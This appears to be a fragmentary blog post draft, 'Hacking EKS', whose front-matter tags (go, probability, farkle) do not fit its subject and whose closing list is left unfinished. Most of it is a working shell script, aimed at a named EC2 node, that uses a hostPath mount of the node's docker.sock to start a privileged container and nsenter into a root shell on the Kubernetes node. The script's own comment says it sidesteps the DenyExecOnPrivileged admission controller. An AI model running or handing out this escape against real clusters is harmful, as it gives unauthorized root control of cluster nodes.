+++
title = "Hacking EKS"
description = "lol iam go brrrr"
date = "2018-12-29"
categories = [ "programming", "post" ]
tags = [
  "go",
  "golang",
  "probability",
  "farkle"
]
+++

root nopriv:
https://gist.github.com/jjo/a8243c677f7e79f2f1d610f02365fdd7#file-kubectl-root-in-host-nopriv-sh-L21

actual command for ip-10-0-1-91.ec2.internal:

```
#!/bin/sh
# Launch a Pod ab-using a hostPath mount to land on a Kubernetes node cluster as root
# without requiring `privileged: true`, in particular can abuse `DenyExecOnPrivileged`
# admission controller.
# Pod command in turn runs a privileged container using node's /var/run/docker.sock.
set -x
kubectl run testpod --restart=Never -it \
    --image overriden --overrides '
{
  "spec": {
    "nodeSelector": { "kubernetes.io/hostname": "'${1:?}'" },
    "tolerations": [{
        "effect": "NoSchedule",
        "key": "node-role.kubernetes.io/master"
    }],
    "containers": [
      {
        "name": "docker",
        "image": "docker:latest",
        "command": [
          "docker", "run", "-it",
          "--privileged", "--pid=host", "--net=host", "docker",
            "sh", "-c",
            "nsenter --mount=/proc/1/ns/mnt -- su -"
        ],
        "stdin": true,
        "tty": true,
        "resources": {"requests": {"cpu": "10m"}},
        "volumeMounts": [
          {"name": "run", "mountPath": "/var/run"}
        ]
      }
    ],
    "volumes": [
     {"name": "run", "hostPath": {"path": "/var/run"}}
    ]
  }
}' --rm --attach "$@"

$ $ ./root-nopriv.sh ip-10-0-1-91.ec2.internal
```

1. run root nopriv
2. 
